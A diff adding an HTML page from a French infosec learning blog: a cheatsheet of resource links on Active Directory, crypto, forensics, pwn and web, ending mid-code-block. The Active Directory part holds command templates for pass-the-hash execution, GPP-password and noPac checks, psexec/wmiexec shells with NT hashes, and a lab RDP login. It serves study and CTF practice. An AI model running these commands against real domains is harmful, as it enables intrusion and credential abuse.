@@ -1,0 +1,1324 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Cheatsheet - </title><meta name="Description" content="Une roadmap en infosec"><meta property="og:title" content="Cheatsheet" />
+<meta property="og:description" content="Une roadmap en infosec" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/posts/cheatsheet/" /><meta property="og:image" content="//localhost:1313/posts/cheatsheet/featured-image.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-07-10T22:27:18+02:00" />
+<meta property="article:modified_time" content="2023-07-10T22:27:18+02:00" /><meta property="og:site_name" content="Nu1t" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="//localhost:1313/posts/cheatsheet/featured-image.png" /><meta name="twitter:title" content="Cheatsheet"/>
+<meta name="twitter:description" content="Une roadmap en infosec"/>
+<meta name="application-name" content="Nu1t">
+<meta name="apple-mobile-web-app-title" content="Nu1t"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/posts/cheatsheet/" /><link rel="prev" href="//localhost:1313/posts/salty/" /><link rel="next" href="//localhost:1313/posts/gcc-ctf/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Cheatsheet",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/posts\/cheatsheet\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/\/localhost:1313\/posts\/cheatsheet\/featured-image.png",
+                            "width":  1440 ,
+                            "height":  720 
+                        }],"genre": "posts","keywords": "active directory, crypto, forensic, pwn, reseau, reverse, web, web3","wordcount":  1370 ,
+        "url": "\/\/localhost:1313\/posts\/cheatsheet\/","datePublished": "2023-07-10T22:27:18+02:00","dateModified": "2023-07-10T22:27:18+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Nu1t"
+            },"description": "Une roadmap en infosec"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">Nu1t</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item active" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">Nu1t</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Cheatsheet</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nu1t</a></span>&nbsp;<span class="post-category">included in <a href="/categories/apprentissage/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Apprentissage</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-07-10">2023-07-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1370 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/cheatsheet/featured-image.png"
+        data-srcset="/posts/cheatsheet/featured-image.png, /posts/cheatsheet/featured-image.png 1.5x, /posts/cheatsheet/featured-image.png 2x"
+        data-sizes="auto"
+        alt="/posts/cheatsheet/featured-image.png"
+        title="Une roadmap en infosec" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#dépôt">Dépôt</a></li>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#vulgarisation">Vulgarisation</a></li>
+    <li><a href="#les-bases">Les bases</a></li>
+    <li><a href="#teach-yourself-infosec">Teach yourself infosec</a></li>
+    <li><a href="#ressources">Ressources</a></li>
+    <li><a href="#active-directory">Active Directory</a>
+      <ul>
+        <li><a href="#bases-ldap">Bases LDAP</a></li>
+        <li><a href="#documentation">Documentation</a></li>
+        <li><a href="#kerberoast">Kerberoast</a></li>
+        <li><a href="#asreproast">AsRepRoast</a></li>
+        <li><a href="#silvergolden-ticket">Silver/Golden Ticket</a></li>
+        <li><a href="#shell">Shell</a></li>
+        <li><a href="#freerdp2">FreeRDP2</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#documentation-1">Documentation</a></li>
+        <li><a href="#cle-publique">Cle publique</a></li>
+        <li><a href="#blocs">Blocs</a></li>
+        <li><a href="#flux">Flux</a></li>
+        <li><a href="#log-discret">Log Discret</a></li>
+        <li><a href="#ecc">ECC</a></li>
+        <li><a href="#cheatsheet">Cheatsheet</a></li>
+        <li><a href="#outils">Outils</a></li>
+        <li><a href="#cours-cryptohack-starters">Cours: Cryptohack Starters</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensic">Forensic</a>
+      <ul>
+        <li><a href="#analyse-de-logs">Analyse de logs</a></li>
+        <li><a href="#exfiltration">Exfiltration</a></li>
+        <li><a href="#tools">Tools:</a></li>
+        <li><a href="#profils-linux-vol3">Profils Linux (Vol3)</a></li>
+        <li><a href="#profils-android">Profils Android</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#documentation-2">Documentation</a></li>
+        <li><a href="#armmipsriscv">ARM,MIPS,RISCV</a></li>
+        <li><a href="#arguments-et-payload">Arguments et payload</a></li>
+        <li><a href="#pilestack">Pile/Stack</a></li>
+        <li><a href="#protections">Protections</a></li>
+        <li><a href="#format-strings">Format Strings</a></li>
+        <li><a href="#tasheap">Tas/Heap</a></li>
+        <li><a href="#kernel">Kernel</a></li>
+        <li><a href="#débuggers-pour-binaires-elf-linux-plus-courants-en-pwn">Débuggers (pour binaires ELF (Linux), plus courants en pwn)</a></li>
+        <li><a href="#plateformes">Plateformes</a></li>
+      </ul>
+    </li>
+    <li><a href="#reseau">Reseau</a>
+      <ul>
+        <li><a href="#documentation-3">Documentation</a></li>
+        <li><a href="#tools-1">Tools</a></li>
+        <li><a href="#curl">Curl</a></li>
+        <li><a href="#http">HTTP</a></li>
+        <li><a href="#ldap">LDAP</a></li>
+        <li><a href="#reverseweb-shell">Reverse/Web shell</a></li>
+        <li><a href="#reverse-proxy">Reverse Proxy</a></li>
+        <li><a href="#wifi">Wifi</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse">Reverse</a>
+      <ul>
+        <li><a href="#introduction--assembleur-x86">Introduction:  Assembleur x86</a></li>
+        <li><a href="#documentation-4">Documentation</a></li>
+        <li><a href="#quelques-outils">Quelques outils:</a></li>
+        <li><a href="#windows">Windows</a></li>
+        <li><a href="#linux">Linux</a></li>
+        <li><a href="#arm">ARM</a></li>
+        <li><a href="#mips">MIPS</a></li>
+        <li><a href="#riscv">RiscV</a></li>
+        <li><a href="#bytecode--outils-spécifiques">Bytecode / Outils spécifiques</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#documentation-5">Documentation</a></li>
+        <li><a href="#extensions">Extensions</a></li>
+        <li><a href="#tools-2">Tools</a></li>
+      </ul>
+    </li>
+    <li><a href="#web3">Web3</a>
+      <ul>
+        <li><a href="#documentation-6">Documentation</a></li>
+      </ul>
+    </li>
+    <li><a href="#pour-aller-plus-loin">Pour aller plus loin</a>
+      <ul>
+        <li><a href="#ressources-générales">Ressources générales</a></li>
+        <li><a href="#chaines">Chaines</a></li>
+        <li><a href="#ctf-24h24-7j7">CTF 24h/24, 7j/7</a></li>
+        <li><a href="#notes-utiles-en-ctf-voire-">Notes utiles en CTF voire +</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="dépôt">Dépôt</h2>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Quelques catégories supplémentaires et notes actualisées<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><a href="https://github.com/4nuit/Hacking" target="_blank" rel="noopener noreffer ">https://github.com/4nuit/Hacking</a></div>
+        </div>
+    </div>
+<h2 id="intro">Intro</h2>
+<p>Ce post est un peu spécial. En effet je tenais à partager quelques ressources, qui m&rsquo;ont permis de mettre un pied dans l&rsquo;infosec en partant de zéro.</p>
+<p>Est-ce légitime en 2023 de proposer cela?</p>
+<p>Effectivement, il y a pléthore d&rsquo;articles, de blogs, de livres ainsi que de communautés.
+Mais il est facile de se confronter à un mur et de se décourager pour diverses raisons.</p>
+<p>Voici donc un agrégat de ressources, en français de préférence:</p>
+<h2 id="vulgarisation">Vulgarisation</h2>
+<p>Des vidéos permettant de découvrir le sujet et de se donner un plan d&rsquo;attaque.</p>
+<p><strong>Hackintux</strong>:
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/NuI2xo6v5ko" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+</p>
+<p><strong>Hafnium</strong>:
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/Q7oMZiiWWek" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+</p>
+<h2 id="les-bases">Les bases</h2>
+<p>Juste quelques cours/playlists d&rsquo;informatique générale pour donner une idée.
+Ok, sauf pour le web (<strong>OpenClassrooms</strong> peut suffire dans tous les cas)</p>
+<ul>
+<li>Linux: 
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/OMaNgQi6Fvc" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+</li>
+<li>Programmation: 
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/90hGCMC3Chc" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+</li>
+<li>Réseau: 
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/26jazyc7VNk" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+</li>
+<li>Web: 
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/J-1s-ONitRc" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+</li>
+</ul>
+<p>Quelques communautés:</p>
+<ul>
+<li><a href="https://lecrabeinfo.net/" target="_blank" rel="noopener noreffer ">https://lecrabeinfo.net/</a></li>
+<li><a href="https://openclassrooms.com/fr/courses" target="_blank" rel="noopener noreffer ">https://openclassrooms.com/fr/courses</a></li>
+<li><a href="https://zestedesavoir.com/" target="_blank" rel="noopener noreffer ">https://zestedesavoir.com/</a></li>
+</ul>
+<h2 id="teach-yourself-infosec">Teach yourself infosec</h2>
+<p>A partir d&rsquo;ici, la sécurité commence.</p>
+<ul>
+<li>
+<p><a href="https://owasp.org/www-community/attacks/" target="_blank" rel="noopener noreffer ">https://owasp.org/www-community/attacks/</a></p>
+</li>
+<li>
+<p><a href="https://d3fend.mitre.org/" target="_blank" rel="noopener noreffer ">https://d3fend.mitre.org/</a></p>
+</li>
+</ul>
+<p>Quelques ressources très complètes ici, par thème.
+Pour chaque catégorie, des ressources et plateformes sont données pour s&rsquo;entraîner.</p>
+<ul>
+<li><a href="https://teachyourselfinfosec.com/" target="_blank" rel="noopener noreffer ">https://teachyourselfinfosec.com/</a></li>
+</ul>
+<p>Dans la même idée, en français:</p>
+<ul>
+<li>
+<p><a href="https://secu.si/" target="_blank" rel="noopener noreffer ">https://secu.si/</a></p>
+</li>
+<li>
+<p><a href="https://wiki.zenk-security.com/doku.php/" target="_blank" rel="noopener noreffer ">https://wiki.zenk-security.com/doku.php/</a></p>
+</li>
+<li>
+<p><a href="https://www.bases-hacking.org/hacking.html" target="_blank" rel="noopener noreffer ">https://www.bases-hacking.org/hacking.html</a></p>
+</li>
+</ul>
+<p>De très bons livres (dont certains tirés d&rsquo;OReilly), cours et articles (pas que sur la sécurité) existent aussi ici:</p>
+<ul>
+<li><a href="https://doc.lagout.org/" target="_blank" rel="noopener noreffer ">https://doc.lagout.org/</a></li>
+</ul>
+<h2 id="ressources">Ressources</h2>
+<p>On entre dans le vif du sujet. Maintenant, choisissez la catégorie qui vous plaît et n&rsquo;hésitez pas à reprendre au point précédent.</p>
+<h2 id="active-directory">Active Directory</h2>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/nhW-0qZzjy4" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<h3 id="bases-ldap">Bases LDAP</h3>
+<p><a href="https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html" target="_blank" rel="noopener noreffer ">https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html</a></p>
+<h3 id="documentation">Documentation</h3>
+<ul>
+<li>
+<p><a href="https://zer1t0.gitlab.io/posts/attacking_ad/" target="_blank" rel="noopener noreffer ">https://zer1t0.gitlab.io/posts/attacking_ad/</a></p>
+</li>
+<li>
+<p><a href="https://ntlm.info/" target="_blank" rel="noopener noreffer ">https://ntlm.info/</a></p>
+</li>
+<li>
+<p><a href="https://tesserent.com/insights/blog/dumping-windows-credentials?utm_source=securusglobal.com&amp;utm_medium=301" target="_blank" rel="noopener noreffer ">https://tesserent.com/insights/blog/dumping-windows-credentials?utm_source=securusglobal.com&utm_medium=301</a></p>
+</li>
+<li>
+<p><a href="https://beta.hackndo.com/pass-the-hash/#protocole-ntlm" target="_blank" rel="noopener noreffer ">https://beta.hackndo.com/pass-the-hash/#protocole-ntlm</a></p>
+</li>
+</ul>
+<p><code>mindmap</code><a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg" target="_blank" rel="noopener noreffer ">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg</a></p>
+<h3 id="kerberoast">Kerberoast</h3>
+<p><strong>SPN non vide</strong></p>
+<ul>
+<li><a href="https://beta.hackndo.com/kerberoasting/" target="_blank" rel="noopener noreffer ">https://beta.hackndo.com/kerberoasting/</a></li>
+<li><a href="https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py" target="_blank" rel="noopener noreffer ">GetUserSPNs.py</a></li>
+</ul>
+<h3 id="asreproast">AsRepRoast</h3>
+<p><strong>User sans PreAuth</strong></p>
+<ul>
+<li><a href="https://beta.hackndo.com/kerberos-asrep-roasting/" target="_blank" rel="noopener noreffer ">https://beta.hackndo.com/kerberos-asrep-roasting/</a></li>
+<li><a href="https://www.login-securite.com/2022/11/03/analyse-et-poc-de-la-cve-2022-33679/" target="_blank" rel="noopener noreffer ">https://www.login-securite.com/2022/11/03/analyse-et-poc-de-la-cve-2022-33679/</a></li>
+<li>(<a href="https://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/" target="_blank" rel="noopener noreffer ">UAC values</a>)</li>
+<li><a href="https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py" target="_blank" rel="noopener noreffer ">GetNPUsers.py</a></li>
+</ul>
+<p><a href="https://0xdf.gitlab.io/2018/12/08/htb-active.html" target="_blank" rel="noopener noreffer ">Box Active (HTB)</a></p>
+<p>Synchroniser l&rsquo;horloge:</p>
+<p><code>sudo ntpdate &lt;ip&gt;</code></p>
+<ul>
+<li><code>crackmapexec</code>:
+<ul>
+<li>check GPPPassword (<a href="https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-spider_plus" target="_blank" rel="noopener noreffer ">share spidering</a>: spider_plus): <code>cme smb &lt;Domain&gt; -u &lt;user&gt; -p &lt;pass&gt; -M gpp_password</code></li>
+<li>check SamAccountName: <code>crackmapexec smb &lt;ip&gt; -M nopac</code> &amp; <code>crackmapexec ldap -d &lt;Domain&gt; -u &lt;user&gt; -p &lt;pass&gt; -M Maq</code> (max machines à créer)</li>
+<li>Pass The Hash: <code>crackmapexec &lt;ip&gt; -u Administrator -H &lt;lmhash:nthash&gt; -x 'whoami'</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="silvergolden-ticket">Silver/Golden Ticket</h3>
+<ul>
+<li><a href="https://beta.hackndo.com/kerberos-silver-golden-tickets/#pac" target="_blank" rel="noopener noreffer ">https://beta.hackndo.com/kerberos-silver-golden-tickets/#pac</a></li>
+<li><a href="https://github.com/fortra/impacket/issues/1457" target="_blank" rel="noopener noreffer ">https://github.com/fortra/impacket/issues/1457</a></li>
+</ul>
+<h3 id="shell">Shell</h3>
+<p><strong><a href="mailto:Domain.local/Administrator@127.0.0.1" rel="">Domain.local/Administrator@127.0.0.1</a></strong></p>
+<p><code>psexec.py &lt;Domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;DC.local&gt;</code>
+<code>wmiexec.py &lt;Domain&gt;/&lt;user&gt;@&lt;DC.local&gt; -hashes ':&lt;nthash&gt;'</code></p>
+<h3 id="freerdp2">FreeRDP2</h3>
+<p>(TryHackMe AD Basics)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xfreerdp /v:10.10.222.63 /u:THM<span class="se">\M</span>ark /p:M4rk3t1ng.21
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="crypto">Crypto</h2>
+<h3 id="documentation-1">Documentation</h3>
+<ul>
+<li><a href="https://joyofcryptography.com/" target="_blank" rel="noopener noreffer ">https://joyofcryptography.com/</a></li>
+<li><a href="https://cryptobook.nakov.com/" target="_blank" rel="noopener noreffer ">https://cryptobook.nakov.com/</a></li>
+</ul>
+<h3 id="cle-publique">Cle publique</h3>
+<ul>
+<li>
+<p><a href="https://crypto.stanford.edu/~dabo/pubs/papers/RSA-survey.pdf" target="_blank" rel="noopener noreffer ">RSA</a>,
+<a href="https://vozec.fr/crypto-rsa/" target="_blank" rel="noopener noreffer ">https://vozec.fr/crypto-rsa/</a> , <a href="https://www.cosade.org/cosade19/cosade14/presentations/session2_b.pdf" target="_blank" rel="noopener noreffer ">Side Channel RSA - RSA CRT cf FCSC</a></p>
+</li>
+<li>
+<p><a href="https://repo.zenk-security.com/Cryptographie%20.%20Algorithmes%20.%20Steganographie/Cle%20Publique.pdf" target="_blank" rel="noopener noreffer ">DSA,ElGamal, RSA-CRT - Zenk</a></p>
+</li>
+<li>
+<p><a href="https://max.levch.in/post/724289457144070144/shamir-secret-sharing" target="_blank" rel="noopener noreffer ">Shamir Secret Sharing</a></p>
+</li>
+</ul>
+<h3 id="blocs">Blocs</h3>
+<ul>
+<li>
+<p><a href="https://braincoke.fr/blog/2020/08/the-aes-encryption-algorithm-explained/#encryption-algorithm-overview" target="_blank" rel="noopener noreffer ">AES</a>,</p>
+<ul>
+<li><a href="https://stackoverflow.com/questions/1220751/how-to-choose-an-aes-encryption-mode-cbc-ecb-ctr-ocb-cfb" target="_blank" rel="noopener noreffer ">https://stackoverflow.com/questions/1220751/how-to-choose-an-aes-encryption-mode-cbc-ecb-ctr-ocb-cfb</a></li>
+</ul>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation" target="_blank" rel="noopener noreffer ">Block cipher modes of operation</a></p>
+<ul>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" target="_blank" rel="noopener noreffer ">https://en.wikipedia.org/wiki/Padding_oracle_attack</a></p>
+</li>
+<li>
+<p><a href="https://crypto.stackexchange.com/questions/42891/chosen-plaintext-attack-on-aes-in-ecb-mode" target="_blank" rel="noopener noreffer ">https://crypto.stackexchange.com/questions/42891/chosen-plaintext-attack-on-aes-in-ecb-mode</a></p>
+</li>
+<li>
+<p><a href="https://security.stackexchange.com/questions/271007/aes-ecb-cookie-bypass" target="_blank" rel="noopener noreffer ">https://security.stackexchange.com/questions/271007/aes-ecb-cookie-bypass</a></p>
+</li>
+<li>
+<p><a href="https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode" target="_blank" rel="noopener noreffer ">https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode</a></p>
+</li>
+<li>
+<p><a href="https://research.nccgroup.com/2021/02/17/cryptopals-exploiting-cbc-padding-oracles/" target="_blank" rel="noopener noreffer ">https://research.nccgroup.com/2021/02/17/cryptopals-exploiting-cbc-padding-oracles/</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="https://vozec.fr/crypto-lattice/lattice-introduction/" target="_blank" rel="noopener noreffer ">https://vozec.fr/crypto-lattice/lattice-introduction/</a></p>
+</li>
+</ul>
+<h3 id="flux">Flux</h3>
+<ul>
+<li>
+<p><a href="https://thehackernews.com/2015/07/crack-rc4-encryption.html" target="_blank" rel="noopener noreffer ">https://thehackernews.com/2015/07/crack-rc4-encryption.html</a></p>
+</li>
+<li>
+<p><a href="https://crypto.stackexchange.com/questions/83629/forgery-attack-on-poly1305-when-the-key-and-nonce-reused" target="_blank" rel="noopener noreffer ">https://crypto.stackexchange.com/questions/83629/forgery-attack-on-poly1305-when-the-key-and-nonce-reused</a></p>
+</li>
+</ul>
+<h3 id="log-discret">Log Discret</h3>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/issM-hvLemE" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<h3 id="ecc">ECC</h3>
+<ul>
+<li><a href="https://people.cs.nctu.edu.tw/~rjchen/ECC2012S/Elliptic%20Curves%20Number%20Theory%20And%20Cryptography%202n.pdf" target="_blank" rel="noopener noreffer ">https://people.cs.nctu.edu.tw/~rjchen/ECC2012S/Elliptic%20Curves%20Number%20Theory%20And%20Cryptography%202n.pdf</a></li>
+<li><a href="https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/" target="_blank" rel="noopener noreffer ">https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/</a></li>
+</ul>
+<h3 id="cheatsheet">Cheatsheet</h3>
+<ul>
+<li><a href="https://github.com/zademn/EverythingCrypto" target="_blank" rel="noopener noreffer ">https://github.com/zademn/EverythingCrypto</a></li>
+<li><a href="https://github.com/jvdsn/crypto-attacks" target="_blank" rel="noopener noreffer ">https://github.com/jvdsn/crypto-attacks</a></li>
+</ul>
+<h3 id="outils">Outils</h3>
+<ul>
+<li><a href="https://theory.stanford.edu/~nikolaj/programmingz3.html" target="_blank" rel="noopener noreffer ">z3</a></li>
+<li><a href="https://www.freecodecamp.org/news/openssl-command-cheatsheet-b441be1e8c4a/" target="_blank" rel="noopener noreffer ">OpenSSL cheatsheet</a></li>
+</ul>
+<p><a href="https://www.login-securite.com/2021/10/29/sthackwriteup-forensic-docker-layer/" target="_blank" rel="noopener noreffer ">https://www.login-securite.com/2021/10/29/sthackwriteup-forensic-docker-layer/</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># AES-CBC</span>
+</span></span><span class="line"><span class="cl">openssl aes-256-cbc -d -iter <span class="m">10</span> -pass pass:<span class="k">$(</span>cat /pass.txt<span class="k">)</span> -in flag.enc -out flag.dec
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Base64 &amp; digest - JWT</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="o">&lt;</span><span class="n">b64</span><span class="p">(</span><span class="n">header</span><span class="p">)</span><span class="o">.</span><span class="n">b64</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">&gt;</span> <span class="o">|</span> <span class="n">openssl</span> <span class="n">dgst</span> <span class="o">-</span><span class="n">sha256</span> <span class="o">-</span><span class="n">mac</span> <span class="n">HMAC</span> <span class="o">-</span><span class="n">macopt</span><span class="p">:</span><span class="n">hexkey</span><span class="p">:</span><span class="o">$</span><span class="p">(</span><span class="n">cat</span> <span class="n">key</span><span class="o">.</span><span class="n">pem</span> <span class="o">|</span> <span class="n">xxd</span> <span class="o">-</span><span class="n">p</span> <span class="o">|</span> <span class="n">tr</span> <span class="o">-</span><span class="n">d</span> <span 